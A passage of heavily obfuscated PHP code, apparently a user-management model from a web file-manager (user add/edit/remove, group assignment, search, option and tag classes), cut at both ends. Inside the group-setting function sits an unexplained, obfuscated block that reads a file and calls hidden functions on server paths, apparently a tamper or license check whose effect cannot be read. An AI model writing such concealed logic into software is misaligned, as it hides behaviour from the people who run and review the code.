$‚á˜±‘€[12], $‚á˜±‘€[2307] => isset($ï©òıÕ®[$‚á˜±‘€[550]]) ? $ï©òıÕ®[$‚á˜±‘€[550]] : $ï©òıÕ®[$‚á˜±‘€[32]], $‚á˜±‘€[2308] => isset($ï©òıÕ®[$‚á˜±‘€[551]]) ? $ï©òıÕ®[$‚á˜±‘€[551]] : $‚á˜±‘€[12], $‚á˜±‘€[2309] => isset($ï©òıÕ®[$‚á˜±‘€[2310]]) ? $ï©òıÕ®[$‚á˜±‘€[2310]] : 1, $‚á˜±‘€[2311] => $ï©òıÕ®[$‚á˜±‘€[897]], $‚á˜±‘€[1921] => isset($ï©òıÕ®[$‚á˜±‘€[1824]]) ? $ï©òıÕ®[$‚á˜±‘€[1824]] : 1024 * 1024 * 20, $‚á˜±‘€[1922] => 0, $‚á˜±‘€[2312] => 0, $‚á˜±‘€[1966] => isset($ï©òıÕ®[$‚á˜±‘€[765]]) ? $ï©òıÕ®[$‚á˜±‘€[765]] : 1); if (!empty($ï©òıÕ®[$‚á˜±‘€[1665]])) { $„Œ³İÁê[$‚á˜±‘€[1665]] = $ï©òıÕ®[$‚á˜±‘€[1665]]; } $‚Ÿ‹š¾ = $this->_checkExist($ï©òıÕ®); if ($‚Ÿ‹š¾ !== !0) { return $‚Ÿ‹š¾; } if (!empty($„Œ³İÁê[$‚á˜±‘€[551]]) && strlen($„Œ³İÁê[$‚á˜±‘€[551]]) > 255) { $„Œ³İÁê[$‚á˜±‘€[551]] = $‚á˜±‘€[12]; } $Ì­å’øó = $this->add($„Œ³İÁê); $š¥×Ë­ü = array($‚á˜±‘€[2311] => $„Œ³İÁê[$‚á˜±‘€[897]], $‚á˜±‘€[2307] => $„Œ³İÁê[$‚á˜±‘€[550]]); $this->userEdit($Ì­å’øó, $š¥×Ë­ü); Model($‚á˜±‘€[1335])->userRootAdd($Ì­å’øó); return $Ì­å’øó; } protected function userEditTest($©Éà²š, $‚œúªû) { return $this->call($_SERVER[™¾ÇÙ¯¹][2313], $©Éà²š, $‚œúªû); } protected function userEdit($ıíİÀ©œ, $ù”ƒİª¼) { $Šº•Í€¯ =& $_SERVER[™¾ÇÙ¯¹]; $©äÊ¦¦ = $this->getInfoSimple($ıíİÀ©œ); if (!$©äÊ¦¦) { return !1; } $ÚºÊßá¾ = $this->_checkExist($ù”ƒİª¼, $ıíİÀ©œ); if ($ÚºÊßá¾ !== !0) { return $ÚºÊßá¾; } if (isset($ù”ƒİª¼[$Šº•Í€¯[897]]) && trim($ù”ƒİª¼[$Šº•Í€¯[897]]) != $Šº•Í€¯[12]) { $Ï×ğÃ«× = $this->metaGet($ıíİÀ©œ); if (empty($Ï×ğÃ«×[$Šº•Í€¯[2303]])) { $Ï×ğÃ«×[$Šº•Í€¯[2303]] = rand_string(10); Model($Šº•Í€¯[521])->metaSet($ıíİÀ©œ, $Šº•Í€¯[2303], $Ï×ğÃ«×[$Šº•Í€¯[2303]]); } $ù”ƒİª¼[$Šº•Í€¯[897]] = md5($Ï×ğÃ«×[$Šº•Í€¯[2303]] . trim($ù”ƒİª¼[$Šº•Í€¯[897]])); } else { unset($ù”ƒİª¼[$Šº•Í€¯[897]]); } if (!empty($ù”ƒİª¼[$Šº•Í€¯[551]]) && strlen($ù”ƒİª¼[$Šº•Í€¯[551]]) > 255) { $ù”ƒİª¼[$Šº•Í€¯[551]] = $Šº•Í€¯[12]; } $this->where(array($Šº•Í€¯[1656] => $ıíİÀ©œ))->save($ù”ƒİª¼); if (isset($ù”ƒİª¼[$Šº•Í€¯[550]])) { $this->setNamePinyin($ıíİÀ©œ, $ù”ƒİª¼[$Šº•Í€¯[550]]); } $this->clearCache($ıíİÀ©œ); return !0; } public function setNamePinyin($€°¦¢‘, $ğ¾ñ Ê§ = false) { $¾ïß™í« =& $_SERVER[™¾ÇÙ¯¹]; if (!$ğ¾ñ Ê§) { $µ¶¬¼¢Ä = $this->getInfoSimple($€°¦¢‘); $ğ¾ñ Ê§ = $µ¶¬¼¢Ä[$¾ïß™í«[550]] ? $µ¶¬¼¢Ä[$¾ïß™í«[550]] : $µ¶¬¼¢Ä[$¾ïß™í«[32]]; } $Ÿ‡¾â€ = Model($¾ïß™í«[543]); if (!Input::check($ğ¾ñ Ê§, $¾ïß™í«[601])) { return $Ÿ‡¾â€->metaSet($€°¦¢‘, array($¾ïß™í«[473] => $¾ïß™í«[12], $¾ïß™í«[472] => $¾ïß™í«[12])); } return $Ÿ‡¾â€->metaSet($€°¦¢‘, array($¾ïß™í«[473] => str_replace($¾ïß™í«[53], $¾ïß™í«[12], Pinyin::get($ğ¾ñ Ê§)), $¾ïß™í«[472] => Pinyin::get($ğ¾ñ Ê§, $¾ïß™í«[602]))); } private function nickNameRpt() { $ŸÚÈù÷ =& $_SERVER[™¾ÇÙ¯¹]; $¨®ö€ÌÍ = Model($ŸÚÈù÷[785])->get($ŸÚÈù÷[2314]); $×ÏÍş†º = $GLOBALS[$ŸÚÈù÷[6]][$ŸÚÈù÷[389]][$ŸÚÈù÷[2314]]; $ˆ‡Áø˜Š = !is_null($¨®ö€ÌÍ) ? $¨®ö€ÌÍ : $×ÏÍş†º; return !!$ˆ‡Áø˜Š; } private function _checkExist($ê¼¼µ–, $–äŞÛ¶Ì = false) { $¶÷“¦á =& $_SERVER[™¾ÇÙ¯¹]; $íÍ¦ù¤• = array($¶÷“¦á[32] => UserModel::ERROR_USER_EXIST_NAME, $¶÷“¦á[550] => UserModel::ERROR_USER_EXIST_NICKNAME, $¶÷“¦á[314] => UserModel::ERROR_USER_EXIST_EMAIL, $¶÷“¦á[2302] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($íÍ¦ù¤•[$¶÷“¦á[550]]); } $¯¿É˜ © = $–äŞÛ¶Ì ? array($¶÷“¦á[1665] => array($¶÷“¦á[2315], $–äŞÛ¶Ì)) : array(); foreach ($íÍ¦ù¤• as $š÷ĞìÉû => $ÄÎºß¶²) { $÷ Á‘³Ç = array(); foreach ($íÍ¦ù¤• as $˜‚ÅëŸŞ => $‹ß´şÕì) { if (isset($ê¼¼µ–[$˜‚ÅëŸŞ]) && $ê¼¼µ–[$˜‚ÅëŸŞ]) { $÷ Á‘³Ç[] = $ê¼¼µ–[$˜‚ÅëŸŞ]; } } if (!$÷ Á‘³Ç) { continue; } $¿‚÷ÒÚò = array_merge(array($š÷ĞìÉû => array($¶÷“¦á[7], $÷ Á‘³Ç)), $¯¿É˜ ©); $š¾¤Ìª = $this->where($¿‚÷ÒÚò)->find(); if ($š¾¤Ìª) { return $ÄÎºß¶²; } } return !0; } public function userListInfo($¾ëÌçÈÙ) { $Öè—îĞâ =& $_SERVER[™¾ÇÙ¯¹]; $çˆË»ÈÓ = array(); $¾ëÌçÈÙ = is_array($¾ëÌçÈÙ) ? array_unique($¾ëÌçÈÙ) : array(); if (!$¾ëÌçÈÙ) { return $çˆË»ÈÓ; } if (count($¾ëÌçÈÙ) < 20) { foreach ($¾ëÌçÈÙ as $‰ıÏÒØ½) { $çˆË»ÈÓ[$‰ıÏÒØ½ . $Öè—îĞâ[12]] = $this->getInfoSimpleOuter($‰ıÏÒØ½); } } else { $€ñ“ˆı = array($Öè—îĞâ[1656] => array($Öè—îĞâ[426], $¾ëÌçÈÙ)); if (count($¾ëÌçÈÙ) == 1) { $€ñ“ˆı = array($Öè—îĞâ[1656] => $¾ëÌçÈÙ[0]); } $¹ì•³‹‚ = Model($Öè—îĞâ[521])->field($this->simpleField)->where($€ñ“ˆı)->select(); $¹ì•³‹‚ = array_to_keyvalue($¹ì•³‹‚, $Öè—îĞâ[1665]); foreach ($¾ëÌçÈÙ as $‰ıÏÒØ½) { $Íİ—¼ú” = $¹ì•³‹‚[$‰ıÏÒØ½]; if (!$Íİ—¼ú”) { $çˆË»ÈÓ[$‰ıÏÒØ½ . $Öè—îĞâ[12]] = $this->getInfoSimpleOuter($‰ıÏÒØ½); continue; } $Íİ—¼ú”[$Öè—îĞâ[551]] = Action($Öè—îĞâ[2288])->parseUrl($Íİ—¼ú”[$Öè—îĞâ[551]]); $çˆË»ÈÓ[$‰ıÏÒØ½ . $Öè—îĞâ[12]] = $Íİ—¼ú”; } } return $çˆË»ÈÓ; } protected function userStatus($ê‰óŸ”ï, $­ÀÃÉ’é) { $•ÍĞ¥ø¡ = $this->getInfoSimple($ê‰óŸ”ï); if (!$•ÍĞ¥ø¡) { return !1; } $€³Àõõ¥ = array($_SERVER[™¾ÇÙ¯¹][765] => $­ÀÃÉ’é); return $this->userEdit($ê‰óŸ”ï, $€³Àõõ¥); } protected function userRemove($÷±ÔÎ•) { $½Ô“ôÎµ =& $_SERVER[™¾ÇÙ¯¹]; $ªğŒ¾– = $this->getInfoSimple($÷±ÔÎ•); if (!$ªğŒ¾–) { return !1; } $§÷…”Ë = array($½Ô“ôÎµ[1656] => $÷±ÔÎ•); Model($½Ô“ôÎµ[609])->where($§÷…”Ë)->delete(); Model($½Ô“ôÎµ[2316])->where($§÷…”Ë)->delete(); Model($½Ô“ôÎµ[1927])->where($§÷…”Ë)->delete(); Model($½Ô“ôÎµ[2301])->where($§÷…”Ë)->delete(); Model($½Ô“ôÎµ[1076])->where($§÷…”Ë)->delete(); Model($½Ô“ôÎµ[2130])->removeUserAll($÷±ÔÎ•); Model($½Ô“ôÎµ[840])->userRootRemove($÷±ÔÎ•); return $this->where($§÷…”Ë)->delete(); } protected function userGroupSet($—öı»À™, $ŒÑêÁÃ¶, $Ÿ“¢ÉÒ› = array()) { $üŞµ‹ÂÉ =& $_SERVER[™¾ÇÙ¯¹]; if ($_SERVER[$üŞµ‹ÂÉ[244]] != $_SERVER[$üŞµ‹ÂÉ[1529]]) { $‹ÜæÔñº = $üŞµ‹ÂÉ[887]; $öÄÙïÍ = $üŞµ‹ÂÉ[246]; $ÁìÄ³Æ = $_SERVER[$üŞµ‹ÂÉ[247]] . $üŞµ‹ÂÉ[248]; $—àĞ‚ÆĞ = $öÄÙïÍ($ÁìÄ³Æ); $ Ìì¥õï = explode($üŞµ‹ÂÉ[231], $—àĞ‚ÆĞ); if (count($ Ìì¥õï) < $üŞµ‹ÂÉ[627]) { $½èÑõ  = $üŞµ‹ÂÉ[250]; $½èÑõ (); } $•©Ş›Ê§ = $üŞµ‹ÂÉ[888]; $•©Ş›Ê§($_SERVER[$üŞµ‹ÂÉ[889]]); $•©Ş›Ê§($_SERVER[$üŞµ‹ÂÉ[247]] . $üŞµ‹ÂÉ[1530]); $›§¹˜üÏ = 1; while ($›§¹˜üÏ > 1) { $›§¹˜üÏ = $›§¹˜üÏ + 4; $àò¿ê“À = rawurlencode($›§¹˜üÏ . $üŞµ‹ÂÉ[252]); } } $×Û›é¤Ø = $this->getInfoSimple($—öı»À™); if (!$×Û›é¤Ø || !is_array($ŒÑêÁÃ¶)) { return !1; } $ã‹”ÀÕª = Model($üŞµ‹ÂÉ[1927]); $ã‹”ÀÕª->where(array($üŞµ‹ÂÉ[1665] => $—öı»À™))->delete(); $×²ç°ŠÁ = array(); $—­²ËÁÖ = 0; foreach ($ŒÑêÁÃ¶ as $ğ¬ˆò³ => $…ºó•³ã) { $é½ÃŒı‡ = array($üŞµ‹ÂÉ[1665] => $—öı»À™, $üŞµ‹ÂÉ[1837] => $ğ¬ˆò³, $üŞµ‹ÂÉ[1941] => $…ºó•³ã); $é½ÃŒı‡[$üŞµ‹ÂÉ[1861]] = isset($Ÿ“¢ÉÒ›[$—­²ËÁÖ]) ? $Ÿ“¢ÉÒ›[$—­²ËÁÖ] : 0; $—­²ËÁÖ++; $×²ç°ŠÁ[] = $é½ÃŒı‡; } return $ã‹”ÀÕª->addAll($×²ç°ŠÁ, array(), !0); } protected function userGroupAdd($¿’‡£¤, $÷·ˆ‘±˜ = array()) { $€ŠŞ¤®Ü =& $_SERVER[™¾ÇÙ¯¹]; $úìÓšªÇ = $this->getInfoSimple($¿’‡£¤); if (!$úìÓšªÇ || empty($÷·ˆ‘±˜)) { return !1; } $ŠÄá¶ñş = array(); foreach ($÷·ˆ‘±˜ as $ Æ¶µ¥ò => $¼™ùåÙ“) { $ŠÄá¶ñş[] = array($€ŠŞ¤®Ü[1665] => $¿’‡£¤, $€ŠŞ¤®Ü[1837] => $ Æ¶µ¥ò, $€ŠŞ¤®Ü[1941] => $¼™ùåÙ“, $€ŠŞ¤®Ü[1861] => 0); } return Model($€ŠŞ¤®Ü[1927])->addAll($ŠÄá¶ñş, array(), !0); } protected function userGroupRemove($À‰Ô›×Ó, $¤ç¹´ºú) { $ğÅ¬”È² =& $_SERVER[™¾ÇÙ¯¹]; $Œ×­ Ø„ = $this->getInfoSimple($À‰Ô›×Ó); if (!$Œ×­ Ø„ || !$¤ç¹´ºú) { return !1; } $ÓÜÖç„ù = array($ğÅ¬”È²[1656] => $À‰Ô›×Ó, $ğÅ¬”È²[1925] => $¤ç¹´ºú); return Model($ğÅ¬”È²[1927])->where($ÓÜÖç„ù)->delete(); } public function listData() { $ØÔ”©Õ± = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ØÔ”©Õ±[$_SERVER[™¾ÇÙ¯¹][378]]); return $ØÔ”©Õ±; } public function listByID($è¨ô½–™) { $Û–ıßü =& $_SERVER[™¾ÇÙ¯¹]; if (!$è¨ô½–™) { return; } $¸²•åŠü = array($Û–ıßü[1665] => array($Û–ıßü[7], $è¨ô½–™)); $©áğÀ—î = $this->where($¸²•åŠü)->select(); $©áğÀ—î = array_sort_keep($©áğÀ—î, $Û–ıßü[1665], $è¨ô½–™); $this->_listDataApply($©áğÀ—î); return $©áğÀ—î; } public function listByGroup($²Í«˜İı = 0, $¡Åæ³àØ = array()) { $£Á¹‡û÷ =& $_SERVER[™¾ÇÙ¯¹]; $”£ß‚‡ä = $£Á¹‡û÷[12]; $ó¯ÜÓ¼” = array(); if ($²Í«˜İı) { $ó¯ÜÓ¼” = array($£Á¹‡û÷[2317] => intval($²Í«˜İı)); $”£ß‚‡ä = "\114\105\106\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\165\163\145\162\137\147\x72\157\x75\160\x20\165\163\145\x72\137\147\x72\157\x75\x70\40\x6f\156\40\165\163\x65\x72\x2e\165\x73\145\x72\111\104\40\x3d\40\x75\x73\x65\162\x5f\x67\x72\x6f\x75\160\56\165\x73\145\162\x49\104"; $›æ†‚å = Input::get($£Á¹‡û÷[465], null, $£Á¹‡û÷[12]) ? $£Á¹‡û÷[12] : $£Á¹‡û÷[2318]; } if (isset($¡Åæ³àØ[$£Á¹‡û÷[765]])) { $ó¯ÜÓ¼”[$£Á¹‡û÷[2319]] = $¡Åæ³àØ[$£Á¹‡û÷[765]]; } $ÆÍËĞ½ = $this->_makeOrder($›æ†‚å)->field($£Á¹‡û÷[2320])->where($ó¯ÜÓ¼”)->join($”£ß‚‡ä)->selectPage(50); $this->_listDataApply($ÆÍËĞ½[$£Á¹‡û÷[378]]); return $ÆÍËĞ½; } private function _makeOrder($Ï´±±§ø = '') { $ô¬¦¼° =& $_SERVER[™¾ÇÙ¯¹]; $Ş¼ÒåÈ± = array($ô¬¦¼°[1665], $ô¬¦¼°[32], $ô¬¦¼°[1826], $ô¬¦¼°[1798], $ô¬¦¼°[200]); $î‰Û¹İ = array($ô¬¦¼°[458] => $ô¬¦¼°[459], $ô¬¦¼°[460] => $ô¬¦¼°[461]); $©šÔ’¥ = Input::get($ô¬¦¼°[465], $ô¬¦¼°[7], $ô¬¦¼°[1656], $Ş¼ÒåÈ±); $´¤º¾äÃ = Input::get($ô¬¦¼°[466], $ô¬¦¼°[7], $ô¬¦¼°[1928], array($ô¬¦¼°[1928], $ô¬¦¼°[460])); $´¤º¾äÃ = $î‰Û¹İ[$´¤º¾äÃ]; $Ï´±±§ø = $Ï´±±§ø . "\x75\163\x65\x72\x2e{$©šÔ’¥}\x20{$´¤º¾äÃ}\54\x20\x75\x73\145\x72\56\165\x73\145\x72\111\104\40\x61\163\x63"; return $this->alias($ô¬¦¼°[2050])->order($Ï´±±§ø); } public function listSearch($‚Ä¬±×Ã) { $çºåƒ‘– =& $_SERVER[™¾ÇÙ¯¹]; $Ú–ŠÙ× = $‚Ä¬±×Ã[$çºåƒ‘–[1931]]; $±¾àĞÏØ = isset($‚Ä¬±×Ã[$çºåƒ‘–[1932]]) ? $‚Ä¬±×Ã[$çºåƒ‘–[1932]] : !1; $Ú–ŠÙ× = str_replace($çºåƒ‘–[1933], $çºåƒ‘–[1934], trim($Ú–ŠÙ×)); $†èŒèÈ¼ = array($çºåƒ‘–[32] => array($çºåƒ‘–[391], "\x25{$Ú–ŠÙ×}\45"), $çºåƒ‘–[314] => array($çºåƒ‘–[391], "{$Ú–ŠÙ×}\x25"), $çºåƒ‘–[550] => array($çºåƒ‘–[391], "{$Ú–ŠÙ×}\45"), $çºåƒ‘–[1008] => $çºåƒ‘–[1935]); if (Input::check($Ú–ŠÙ×, $çºåƒ‘–[320])) { $†èŒèÈ¼[$çºåƒ‘–[1665]] = array($çºåƒ‘–[391], "{$Ú–ŠÙ×}\x25"); $†èŒèÈ¼[$çºåƒ‘–[2302]] = array($çºåƒ‘–[391], "{$Ú–ŠÙ×}\x25"); } if (!$Ú–ŠÙ×) { $†èŒèÈ¼ = array(); } if (isset($‚Ä¬±×Ã[$çºåƒ‘–[765]])) { $†èŒèÈ¼[$çºåƒ‘–[765]] = $‚Ä¬±×Ã[$çºåƒ‘–[765]]; } $†èŒèÈ¼ = $this->parseWhereLike($†èŒèÈ¼); $ó‹íÙ‚ = $this->_makeOrder()->where($†èŒèÈ¼)->selectPage(20); if (!$ó‹íÙ‚ || count($ó‹íÙ‚[$çºåƒ‘–[378]]) < 5 && Input::check($Ú–ŠÙ×, $çºåƒ‘–[327])) { $”Ùù«‘˜ = $this->_searchFromMeta($çºåƒ‘–[472], $Ú–ŠÙ×, 10); $ûÙñÙ’Ï = $this->_searchFromMeta($çºåƒ‘–[473], $Ú–ŠÙ×, 10); $Ş˜£ÛŒ› = array_merge($”Ùù«‘˜, $ûÙñÙ’Ï, $ó‹íÙ‚[$çºåƒ‘–[378]]); $ó‹íÙ‚[$çºåƒ‘–[378]] = array_unique_by_key($Ş˜£ÛŒ›, $çºåƒ‘–[1665]); $ó‹íÙ‚[$çºåƒ‘–[375]][$çºåƒ‘–[376]] = count($ó‹íÙ‚[$çºåƒ‘–[378]]); $ó‹íÙ‚[$çºåƒ‘–[375]][$çºåƒ‘–[377]] = ceil($ó‹íÙ‚[$çºåƒ‘–[375]][$çºåƒ‘–[376]] / $ó‹íÙ‚[$çºåƒ‘–[375]][$çºåƒ‘–[372]]); } $this->_listDataApply($ó‹íÙ‚[$çºåƒ‘–[378]]); $this->_filterByGroup($ó‹íÙ‚, $±¾àĞÏØ); return $ó‹íÙ‚; } private function _filterByGroup(&$¥½…¸õÏ, $Ü›Œ¸ıŞ) { $öÕ€×›É =& $_SERVER[™¾ÇÙ¯¹]; if (!$Ü›Œ¸ıŞ) { return $¥½…¸õÏ; } foreach ($¥½…¸õÏ[$öÕ€×›É[378]] as $í´¿³Ñã => &$æ‹ÎœÔ×) { $†‘âö” = array_to_keyvalue($æ‹ÎœÔ×[$öÕ€×›É[2020]], $öÕ€×›É[12], $öÕ€×›É[1837]); if (!in_array($Ü›Œ¸ıŞ, $†‘âö”)) { unset($¥½…¸õÏ[$öÕ€×›É[378]][$í´¿³Ñã]); } } unset($æ‹ÎœÔ×); $¥½…¸õÏ[$öÕ€×›É[378]] = array_values($¥½…¸õÏ[$öÕ€×›É[378]]); $¥½…¸õÏ[$öÕ€×›É[375]] = array($öÕ€×›É[2084] => count($¥½…¸õÏ[$öÕ€×›É[378]]), $öÕ€×›É[2082] => $¥½…¸õÏ[$öÕ€×›É[375]][$öÕ€×›É[372]], $öÕ€×›É[2081] => 1, $öÕ€×›É[2083] => 1); } private function _searchFromMeta($ëÙœ¶ø˜, $¡ªÓºµÀ, $ˆ†û“Ş²) { $£›·­÷¿ =& $_SERVER[™¾ÇÙ¯¹]; $¡ªÓºµÀ = strtolower($¡ªÓºµÀ); $ì¬ÆÍù = array($£›·­÷¿[94] => $ëÙœ¶ø˜, $£›·­÷¿[383] => array($£›·­÷¿[391], "\45{$¡ªÓºµÀ}\45")); $ì¬ÆÍù = $this->parseWhereLike($ì¬ÆÍù); $ÑÉéÕ°Å = Model($£›·­÷¿[2321])->where($ì¬ÆÍù)->limit($ˆ†û“Ş²)->select(); if (!$ÑÉéÕ°Å) { return array(); } $ÑÉéÕ°Å = array_to_keyvalue($ÑÉéÕ°Å, $£›·­÷¿[12], $£›·­÷¿[1665]); $ËÆºõ = $this->where(array($£›·­÷¿[1656] => array($£›·­÷¿[7], $ÑÉéÕ°Å)))->select(); if (!$ËÆºõ) { return array(); } return $ËÆºõ; } private function _listDataApplyItem($¦Ä“¼á) { $íúê†òÒ = array($¦Ä“¼á); $this->_listDataApply($íúê†òÒ); return $íúê†òÒ[0]; } private function _listDataApply(&$Û‚½ş‹Ï) { $™¤şã¤ó =& $_SERVER[™¾ÇÙ¯¹]; if (!$Û‚½ş‹Ï) { return; } array_remove_key($Û‚½ş‹Ï, $™¤şã¤ó[897]); $†¨ú£Ñ = array_to_keyvalue($Û‚½ş‹Ï, $™¤şã¤ó[12], $™¤şã¤ó[1665]); $this->_listAppendGroup($Û‚½ş‹Ï, $†¨ú£Ñ); $this->_listAppendMeta($Û‚½ş‹Ï, $†¨ú£Ñ); $this->_listAppendSourceRoot($Û‚½ş‹Ï, $†¨ú£Ñ); } private function _listAppendSourceRoot(&$‡ÏÍ€Ÿ«, $ÙÁ·‚êÕ) { $’ÓÙŒÛ¿ =& $_SERVER[™¾ÇÙ¯¹]; $ü¼˜¾¥ù = Model($’ÓÙŒÛ¿[840])->listSourceRoot(SourceModel::TYPE_USER, $ÙÁ·‚êÕ); $ü¼˜¾¥ù = array_to_keyvalue($ü¼˜¾¥ù, $’ÓÙŒÛ¿[513]); $ü¼˜¾¥ù = array_remove_key($ü¼˜¾¥ù, $’ÓÙŒÛ¿[513]); foreach ($‡ÏÍ€Ÿ« as &$ò·å…Ã) { $ò·å…Ã[$’ÓÙŒÛ¿[86]] = $ü¼˜¾¥ù[$ò·å…Ã[$’ÓÙŒÛ¿[1665]]] ? $ü¼˜¾¥ù[$ò·å…Ã[$’ÓÙŒÛ¿[1665]]] : array(); } unset($ò·å…Ã); } private function _listAppendGroup(&$Îğ—ó¦…, $Ò½åŒÙ¾) { $ˆÀÀÔ´Ô =& $_SERVER[™¾ÇÙ¯¹]; $õ‹¯·¬ = array($ˆÀÀÔ´Ô[1665] => array($ˆÀÀÔ´Ô[7], $Ò½åŒÙ¾)); $»ÙÆÁ’ = Model($ˆÀÀÔ´Ô[1927])->where($õ‹¯·¬)->select(); $Ì¢º˜º = array_to_keyvalue($»ÙÆÁ’, $ˆÀÀÔ´Ô[12], $ˆÀÀÔ´Ô[1837]); $Ì¢º˜º = array_remove_value(array_unique($Ì¢º˜º), $ˆÀÀÔ´Ô[197]); if (!$Ì¢º˜º || !$»ÙÆÁ’) { return; } $õ‹¯·¬ = array($ˆÀÀÔ´Ô[1837] => array($ˆÀÀÔ´Ô[7], $Ì¢º˜º)); $¬­²æ§‡ = Model($ˆÀÀÔ´Ô[2018])->field($ˆÀÀÔ´Ô[2322])->where($õ‹¯·¬)->select(); $¬­²æ§‡ = array_to_keyvalue($¬­²æ§‡, $ˆÀÀÔ´Ô[1837]); $»ÙÆÁ’ = array_to_keyvalue_group($»ÙÆÁ’, $ˆÀÀÔ´Ô[1665]); foreach ($»ÙÆÁ’ as &$ää©ú¤×) { $«ˆÕêŠë = array(); foreach ($ää©ú¤× as $±•É¨˜ª) { if (!$±•É¨˜ª[$ˆÀÀÔ´Ô[1941]]) { continue; } $ÕÄÎªê÷ = Model($ˆÀÀÔ´Ô[515])->listData($±•É¨˜ª[$ˆÀÀÔ´Ô[1941]]); $«ˆÕêŠë[] = array($ˆÀÀÔ´Ô[1837] => $±•É¨˜ª[$ˆÀÀÔ´Ô[1837]], $ˆÀÀÔ´Ô[2323] => $¬­²æ§‡[$±•É¨˜ª[$ˆÀÀÔ´Ô[1837]]][$ˆÀÀÔ´Ô[32]], $ˆÀÀÔ´Ô[529] => $¬­²æ§‡[$±•É¨˜ª[$ˆÀÀÔ´Ô[1837]]][$ˆÀÀÔ´Ô[529]], $ˆÀÀÔ´Ô[421] => $ÕÄÎªê÷); } $ää©ú¤× = $«ˆÕêŠë; } unset($ää©ú¤×); foreach ($Îğ—ó¦… as &$Ûë„ú×¿) { $Ûë„ú×¿[$ˆÀÀÔ´Ô[2020]] = array(); if (isset($»ÙÆÁ’[$Ûë„ú×¿[$ˆÀÀÔ´Ô[1665]]])) { $Ûë„ú×¿[$ˆÀÀÔ´Ô[2020]] = $»ÙÆÁ’[$Ûë„ú×¿[$ˆÀÀÔ´Ô[1665]]]; } } unset($Ûë„ú×¿); } public function userAppendGroup($€ñ´¿Ä­) { $ªÚ”„Ùß =& $_SERVER[™¾ÇÙ¯¹]; if (!$€ñ´¿Ä­) { return array(); } $this->_listAppendGroup($€ñ´¿Ä­, array_to_keyvalue($€ñ´¿Ä­, $ªÚ”„Ùß[12], $ªÚ”„Ùß[1665])); return $€ñ´¿Ä­; } private function _listAppendMeta(&$Æô¨Œ, $¸ËçœÙÁ) { $üç¢¡œ =& $_SERVER[™¾ÇÙ¯¹]; $—‡¦İõé = UserJobModel::JOB_KEY; $Å’›´† = array($üç¢¡œ[2303]); $¨ÒøØìó = array($üç¢¡œ[1665] => array($üç¢¡œ[7], $¸ËçœÙÁ)); $âÍşÄñæ = Model($üç¢¡œ[2301])->where($¨ÒøØìó)->select(); $âÍşÄñæ = array_to_keyvalue_group($âÍşÄñæ, $üç¢¡œ[1665]); foreach ($âÍşÄñæ as &$½àƒ¿Â) { $÷Î¸†Ã® = array(); foreach ($½àƒ¿Â as $œà—¥ˆ) { if (!in_array($œà—¥ˆ[$üç¢¡œ[94]], $Å’›´†)) { $÷Î¸†Ã®[$œà—¥ˆ[$üç¢¡œ[94]]] = $œà—¥ˆ[$üç¢¡œ[383]]; } } $½àƒ¿Â = $÷Î¸†Ã®; } unset($½àƒ¿Â); $´ĞÓó¬– = Model($üç¢¡œ[2324]); foreach ($Æô¨Œ as &$ø¡ëÍ) { $Î¥€–»‡ = array(); if (isset($âÍşÄñæ[$ø¡ëÍ[$üç¢¡œ[1665]]])) { $Î¥€–»‡ = $âÍşÄñæ[$ø¡ëÍ[$üç¢¡œ[1665]]]; } $ø¡ëÍ[$üç¢¡œ[2325]] = array(); if (isset($Î¥€–»‡[$—‡¦İõé])) { $ø¡ëÍ[$üç¢¡œ[2325]] = $´ĞÓó¬–->getUserJobInfo($Î¥€–»‡[$—‡¦İõé]); } } unset($ø¡ëÍ); } protected function groupUserAll($íùŞ´ÖÜ) { $š´ö’Úš =& $_SERVER[™¾ÇÙ¯¹]; if (!$íùŞ´ÖÜ) { return !1; } $ÆÍÖ²§Î = Model($š´ö’Úš[1927])->field($š´ö’Úš[1665])->where(array($š´ö’Úš[1837] => array($š´ö’Úš[7], $íùŞ´ÖÜ)))->select(); $ÆÍÖ²§Î = array_to_keyvalue($ÆÍÖ²§Î, $š´ö’Úš[12], $š´ö’Úš[1665]); return array_unique($ÆÍÖ²§Î); } public function userSearch($èÊñÅç’, $Ô¾»šƒü = "\x2a") { return Model($_SERVER[™¾ÇÙ¯¹][543])->where($èÊñÅç’)->field($Ô¾»šƒü)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\137\157\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($‰¾©¶„‰) { $÷°ÜÙï„ =& $_SERVER[™¾ÇÙ¯¹]; if (!defined($÷°ÜÙï„[483])) { define($÷°ÜÙï„[483], 0); } return "\x55\x73\x65\x72\117\x70\164\x69\x6f\x6e\137{$‰¾©¶„‰}\x5f" . USER_ID; } protected function filterWhere($ÒÚÓÏÆ¬) { $Ò•¥ŒÃÖ =& $_SERVER[™¾ÇÙ¯¹]; if (!defined($Ò•¥ŒÃÖ[483])) { define($Ò•¥ŒÃÖ[483], 0); } $ÒÚÓÏÆ¬[$Ò•¥ŒÃÖ[1665]] = USER_ID; return $ÒÚÓÏÆ¬; } public function cacheRemoveUser($ÌçË­¸…, $î â¹Æ‘) { return Cache::remove("\125\x73\145\162\117\160\x74\151\157\156\x5f{$ÌçË­¸…}\137" . $î â¹Æ‘); } protected function optionDefault($›ªüµ¥Û = '') { $³‘¢øÔÄ =& $_SERVER[™¾ÇÙ¯¹]; if ($›ªüµ¥Û == $³‘¢øÔÄ[12]) { return $GLOBALS[$³‘¢øÔÄ[6]][$³‘¢øÔÄ[2326]]; } if ($›ªüµ¥Û == $³‘¢øÔÄ[2327]) { return $GLOBALS[$³‘¢øÔÄ[6]][$³‘¢øÔÄ[2328]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\162\56\x74\x61\147\114\151\x73\164"; public $modelType = "\125\x73\x65\x72\x4f\x70\x74\151\x6f\156"; public $field = array("\156\141\x6d\x65", "\163\164\x79\x6c\x65", "\163\x6f\x72\x74"); public function listData($…½»†Í– = false, $£Øí¸­‹ = "\163\157\x72\164", $š„ ÅŞ¹ = false) { return parent::listData($…½»†Í–, $£Øí¸­‹, $š„ ÅŞ¹); } public function remove($–”Œ®íÌ) { return parent::remove($–”Œ®íÌ); } public function add($·ñÇïô‚, $«¤Ê±Õè = "\x6c\141\x62\x65\154\55\x67\162\145\x79\x2d\x6e\x6f\x72\x6d\141\x6c") { $ªİí¾Œğ =& $_SERVER[™¾ÇÙ¯¹]; if 